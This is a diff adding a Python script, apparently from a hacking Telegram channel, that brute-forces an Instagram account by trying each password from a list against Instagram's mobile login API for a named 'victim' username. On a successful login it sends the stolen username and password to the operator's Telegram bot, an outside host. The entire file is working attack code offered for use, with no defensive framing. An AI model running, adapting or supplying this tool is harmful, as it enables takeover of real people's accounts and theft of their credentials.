@@ -1,0 +1,68 @@
+import requests,os,time,uuid
+try:
+	from user_agent import generate_user_agent
+except ModuleNotFoundError:
+	print("- Module eror • ")
+	os.system('pip install user_agent')
+try:
+	import pyfiglet
+except ModuleNotFoundError:
+	print("- Module eror • ")
+	os.system('pip install pyfiglet')
+try:
+	import webbrowser
+except ModuleNotFoundError:
+	print("- Module eror •..")
+
+Z =  '\033[1;31m' 
+F = '\033[2;32m' 
+B = '\033[2;36m'
+X = '\033[1;33m' 
+C = '\033[2;35m'
+
+logo = pyfiglet.figlet_format('                     hackingareas1')
+print(B + logo)
+webbrowser.open('https://t.me/hackingareas1')
+ID = input('Enter Your Tg id -> ')
+token = input('Enter Bot token -> ')
+r = requests.Session()
+
+file = input('Enter combo path -> ')
+rfile = open(file, 'r')
+
+us = input('Enter victim Username -> ')
+while True:
+	user = us
+	password = rfile.readline().split('\n')[0]
+
+	url = 'https://i.instagram.com/api/v1/accounts/login/'
+	
+	headers = {
+		'Content-Length': '294',
+		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+		'Host': 'i.instagram.com',
+		
+		'Connection': 'Keep-Alive',
+		'User-Agent': 'Instagram 113.0.0.39.122 Android (31/12; 280dpi; 720x1471; samsung; SM-A025F; a02q; qcom; en_US)',
+		'Accept-Language': 'en-US',
+		
+		'X-IG-Connection-Type': 'WIFI',
+		'X-IG-Capabilities': 'AQ==',
+		'Accept-Encoding': 'gzip',}
+	data = {
+		"username": user,
+		"password": password,
+		"device_id": str(uuid.uuid4()),
+	}
+	
+	response = requests.post(url,headers=headers,data=data)
+	
+	if 'logged_in_user' in response.text:
+		print(F + 'user name -> '+user)
+		print(F + 'password -> '+password)
+		mdc = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= •  Got Hit \n~ UserName -> {user}\nPassword -> {password}~ Developer : @Haxkx | Channel : @Haxkx ~ ''')
+		i = requests.post(mdc)
+	
+	else:
+		print(Z + 'Bad Pass -> '+password)
+		
